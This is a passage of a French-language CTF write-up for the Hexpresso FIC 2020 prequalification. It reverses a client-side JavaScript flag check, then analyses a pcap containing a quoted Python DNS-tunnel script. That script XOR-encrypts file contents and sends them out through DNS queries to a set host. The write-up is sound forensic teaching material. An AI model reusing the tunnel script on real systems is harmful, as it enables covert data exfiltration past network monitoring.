@@ -1,0 +1,698 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[FIC 2020] - Hexpresso CTF Prequals - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta property="og:title" content="[FIC 2020] - Hexpresso CTF Prequals"><meta property="og:description" content="Le CTF &ldquo;CaptureTheFic&rdquo; est organisé par l&rsquo;équipe de CTF &ldquo;Hexpresso&rdquo;. Equipe connue pour ses différents résultats en CTF et pour l&rsquo;organisation de CTF, tel que le BreizhCTF.
+CaptureTheFic se déroule en deux étapes:
+Une étape de pré-qualifications en ligne avec énormément d&rsquo;équipes; Une phase finale au FIC, composée des 14 meilleures équipes issues des pré-qualifications. Comme ce writeup le montrera, ce CTF n&rsquo;est pas un jeopardy standard. Cette préqualification comporte 8 étapes et il est nécessaire de terminer une épreuve pour accéder à la suivante."><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/writeups/hexpressofix2020/"><meta property="og:image" content="/logo.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-01-21T21:57:40+08:00"><meta property="article:modified_time" content="2020-01-21T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/logo.png"><meta name=twitter:title content="[FIC 2020] - Hexpresso CTF Prequals"><meta name=twitter:description content="Le CTF &ldquo;CaptureTheFic&rdquo; est organisé par l&rsquo;équipe de CTF &ldquo;Hexpresso&rdquo;. Equipe connue pour ses différents résultats en CTF et pour l&rsquo;organisation de CTF, tel que le BreizhCTF.
+CaptureTheFic se déroule en deux étapes:
+Une étape de pré-qualifications en ligne avec énormément d&rsquo;équipes; Une phase finale au FIC, composée des 14 meilleures équipes issues des pré-qualifications. Comme ce writeup le montrera, ce CTF n&rsquo;est pas un jeopardy standard. Cette préqualification comporte 8 étapes et il est nécessaire de terminer une épreuve pour accéder à la suivante."><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/writeups/hexpressofix2020/><link rel=prev href=maki.bzh/writeups/santhacklaus2019goldenrush/><link rel=next href=maki.bzh/writeups/fcscallemand2020reme/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[FIC 2020] - Hexpresso CTF Prequals","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/writeups\/hexpressofix2020\/"},"image":["\/images\/Apple-Devices-Preview.png"],"genre":"writeups","keywords":"hexpresso, fic, forensic, pentest, cryptography, reverse, pyjail","wordcount":3874,"url":"maki.bzh\/writeups\/hexpressofix2020\/","datePublished":"2020-01-21T21:57:40+08:00","dateModified":"2020-01-21T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">[FIC 2020] - Hexpresso CTF Prequals</h1><div class=content id=content><p>Le CTF &ldquo;CaptureTheFic&rdquo; est organisé par l&rsquo;équipe de CTF &ldquo;Hexpresso&rdquo;. Equipe connue pour ses différents résultats en CTF et pour l&rsquo;organisation de CTF, tel que le BreizhCTF.</p><p>CaptureTheFic se déroule en deux étapes:</p><ul><li>Une étape de pré-qualifications en ligne avec énormément d&rsquo;équipes;</li><li>Une phase finale au FIC, composée des 14 meilleures équipes issues des pré-qualifications.</li></ul><p>Comme ce writeup le montrera, ce CTF n&rsquo;est pas un jeopardy standard. Cette préqualification comporte 8 étapes et il est nécessaire de terminer une épreuve pour accéder à la suivante.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_f44937ec8e786ff1858da67a94d68bfe.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_f44937ec8e786ff1858da67a94d68bfe.png, /lib/images/writeups/2020_hexpresso_fic/upload_f44937ec8e786ff1858da67a94d68bfe.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_f44937ec8e786ff1858da67a94d68bfe.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_f44937ec8e786ff1858da67a94d68bfe.png title=/lib/images/writeups/2020_hexpresso_fic/upload_f44937ec8e786ff1858da67a94d68bfe.png></p><h2 id=i-step-1---reverse-js>I. Step 1 - Reverse JS</h2><table><thead><tr><th>Event</th><th>Challenge</th><th>Category</th><th>Solves</th></tr></thead><tbody><tr><td>CatureTheFic</td><td>Step 1</td><td>Web</td><td>674</td></tr></tbody></table><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_2e6da6a14bb64fe77fe17a6a5682a36a.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_2e6da6a14bb64fe77fe17a6a5682a36a.png, /lib/images/writeups/2020_hexpresso_fic/upload_2e6da6a14bb64fe77fe17a6a5682a36a.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_2e6da6a14bb64fe77fe17a6a5682a36a.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_2e6da6a14bb64fe77fe17a6a5682a36a.png title=/lib/images/writeups/2020_hexpresso_fic/upload_2e6da6a14bb64fe77fe17a6a5682a36a.png></p><h3 id=i1-etat-de-lart>I.1. Etat de l&rsquo;art</h3><p>On commence ce premier challenge avec une page web qui nous propose de soumettre un flag. Si le flag n&rsquo;est pas correct, la page nous répond &ldquo;NOPE&rdquo; avec une pop-up.</p><p>Pour trouver la bonne entrée, nous essayons de voir si la vérification du flag ne se fait pas côté client. Pour cela, on affiche les sources de la page. Après avoir affiché les sources de la page, on remarque un script JavaScript.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_2e74054eee2fa876c8c8f38ef401c2b8.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_2e74054eee2fa876c8c8f38ef401c2b8.png, /lib/images/writeups/2020_hexpresso_fic/upload_2e74054eee2fa876c8c8f38ef401c2b8.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_2e74054eee2fa876c8c8f38ef401c2b8.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_2e74054eee2fa876c8c8f38ef401c2b8.png title=/lib/images/writeups/2020_hexpresso_fic/upload_2e74054eee2fa876c8c8f38ef401c2b8.png></p><p>La vérification du flag se fait bien côté client. Il faut maintenant comprendre comment marche ce script.</p><p>Le script effectue tout simplement une opération arithmétique entre deux chaînes de caractères qui sont notre flag et une constante &ldquo;u_u&rdquo; qui vaut &ldquo;CTF.By.HexpressoCTF.By.Hexpresso&rdquo;.</p><p>Pour chaque caractère présent dans la chaîne &ldquo;u_u&rdquo;, le script va prendre le code UTF-16 du caractère n de la chaîne &ldquo;u_u&rdquo;, l&rsquo;additionner avec le code UTF-16 du caractère n du flag rentré par l&rsquo;utilisateur puis ajouter 42 x n. Il va ensuite comparer ce nombre à l&rsquo;élément n du tableau game comme montré dans les lignes de code ci-dessous:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>u_u</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span><span class=nx>u_u</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=o>+</span> <span class=nx>flag</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=o>+</span> <span class=nx>i</span> <span class=o>*</span> <span class=mi>42</span> <span class=o>!=</span> <span class=nx>game</span><span class=p>[</span><span class=nx>i</span><span class=p>])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;NOPE&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=i2-algorithme-de-rétroingénierie-du-script-js>I.2. Algorithme de rétroingénierie du script JS</h3><p>Pour résoudre ce challenge, il suffit de calculer flag qui est égal à</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javaScript data-lang=javaScript><span class=line><span class=cl>    <span class=nx>flag</span> <span class=o>=</span> <span class=kr>char</span><span class=p>(</span><span class=nx>game</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>-</span> <span class=nx>i</span> <span class=o>*</span> <span class=mi>42</span> <span class=o>-</span> <span class=nx>u_u</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>i</span><span class=p>));</span>
+</span></span></code></pre></td></tr></table></div></div><p>Pour cela on implémente un script python qui est le suivant pour résoudre ce challenge:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>game</span> <span class=o>=</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>        <span class=mi>116</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>228</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>203</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>270</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>334</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>382</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>354</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>417</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>485</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>548</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>586</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>673</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>658</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>761</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>801</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>797</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>788</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>850</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>879</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>894</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>959</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>1059</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>1071</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>1140</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>1207</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>1226</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>1258</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>1305</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>1376</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>1385</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>1431</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>1515</span>
+</span></span><span class=line><span class=cl>        <span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>u_u</span> <span class=o>=</span> <span class=s2>&#34;CTF.By.HexpressoCTF.By.Hexpresso&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=c1>#flag = document.getElementById(&#34;flag&#34;).value;</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>u_u</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=nb>chr</span><span class=p>((</span><span class=nb>ord</span><span class=p>(</span><span class=n>u_u</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>-</span> <span class=n>game</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=n>i</span><span class=o>*</span><span class=mi>42</span> <span class=p>)</span><span class=o>*-</span><span class=mi>1</span><span class=p>),</span> <span class=n>end</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><blockquote><p>1f1bd383026a5db8145258efb869c48f</p></blockquote><p>Une fois le bon flag soumis, on arrive directement à l&rsquo;étape 2.</p><h2 id=ii-step-2---old-exfil-but-gold>II. Step 2 - Old EXFIL but Gold</h2><p><a href=https://ctf.hexpresso.fr/1f1bd383026a5db8145258efb869c48f target=_blank rel="noopener noreffer">https://ctf.hexpresso.fr/1f1bd383026a5db8145258efb869c48f</a></p><table><thead><tr><th>Event</th><th>Challenge</th><th>Category</th><th>Solves</th></tr></thead><tbody><tr><td>CatureTheFic</td><td>Step 2</td><td>Forensic / Crypto</td><td>531</td></tr></tbody></table><h3 id=ii1-etat-de-lart>II.1. Etat de l&rsquo;art</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_264dea3e7b82050631a5215821682f40.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_264dea3e7b82050631a5215821682f40.png, /lib/images/writeups/2020_hexpresso_fic/upload_264dea3e7b82050631a5215821682f40.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_264dea3e7b82050631a5215821682f40.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_264dea3e7b82050631a5215821682f40.png title=/lib/images/writeups/2020_hexpresso_fic/upload_264dea3e7b82050631a5215821682f40.png></p><p>Cette deuxième épreuve nous laisse avec un fichier pcap.</p><p>On remarque différents types de flux dont beaucoup de paquets utilisant le protocole DNS. Après avoir suivi le HTTP Stream sur Wireshark de certains paquets, on remarque que l&rsquo;utilisateur a voulu implémenté un tunnel DNS en python (dnstunnel.py) avec un algorithme de chiffrement maison laissant à désirer.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_6343d17e234d7f87f3f884dc1c16c905.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_6343d17e234d7f87f3f884dc1c16c905.png, /lib/images/writeups/2020_hexpresso_fic/upload_6343d17e234d7f87f3f884dc1c16c905.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_6343d17e234d7f87f3f884dc1c16c905.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_6343d17e234d7f87f3f884dc1c16c905.png title=/lib/images/writeups/2020_hexpresso_fic/upload_6343d17e234d7f87f3f884dc1c16c905.png></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
+</span></span><span class=line><span class=cl><span class=c1># I have no idea of what I&#39;m doing</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#Because why not!</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;data.txt&#39;</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Sending </span><span class=si>%d</span><span class=s2> bytes of data&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#This is propa codaz</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Cut in pieces ... &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encrypt</span><span class=p>(</span><span class=n>l</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#High quality cryptographer!</span>
+</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span><span class=mi>254</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=nb>hex</span><span class=p>(</span><span class=n>key</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>l</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>        <span class=n>aes</span> <span class=o>=</span> <span class=nb>ord</span><span class=p>(</span><span class=n>l</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>^</span> <span class=n>key</span>
+</span></span><span class=line><span class=cl>        <span class=c1>#my computer teacher hates me</span>
+</span></span><span class=line><span class=cl>        <span class=n>output</span> <span class=o>+=</span> <span class=nb>hex</span><span class=p>(</span><span class=n>aes</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>output</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>udp_secure_tunneling</span><span class=p>(</span><span class=n>my_secure_data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#Gee, I&#39;m so bad at coding</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#if 0:</span>
+</span></span><span class=line><span class=cl>    <span class=n>mycmd</span> <span class=o>=</span> <span class=s2>&#34;host -t A </span><span class=si>%s</span><span class=s2>.local.tux 172.16.42.222&#34;</span> <span class=o>%</span> <span class=n>my_secure_data</span>
+</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=n>mycmd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#We loose packet sometimes?</span>
+</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;sleep 1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#end if</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_data</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#because I love globals</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>n</span>
+</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=n>n</span><span class=o>+</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=n>length</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=mi>11</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># If we send more bytes we can recover if we loose some packets?</span>
+</span></span><span class=line><span class=cl>    <span class=n>redundancy</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>chunk</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>s</span><span class=p>:</span><span class=n>s</span><span class=o>+</span><span class=n>length</span><span class=o>+</span><span class=n>redundancy</span><span class=p>]</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>chunk</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%04d%s</span><span class=s2>&#34;</span><span class=o>%</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=n>chunk</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%04d</span><span class=s2> packet --&gt; </span><span class=si>%s</span><span class=s2>.local.tux&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>n</span><span class=p>,</span><span class=n>chunk</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>blob</span> <span class=o>=</span> <span class=n>encrypt</span><span class=p>(</span><span class=n>chunk</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>udp_secure_tunneling</span><span class=p>(</span><span class=n>blob</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>s</span> <span class=o>+</span> <span class=n>length</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>cursor</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>n</span><span class=o>=</span><span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>cursor</span><span class=o>&lt;</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>cursor</span> <span class=o>=</span> <span class=n>send_data</span><span class=p>(</span><span class=n>cursor</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#Is it ok?</span>
+</span></span></code></pre></td></tr></table></div></div><p>On importe en local ce script pour comprendre son fonctionnement.</p><p>La méthode de chiffrement est un simple XOR:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
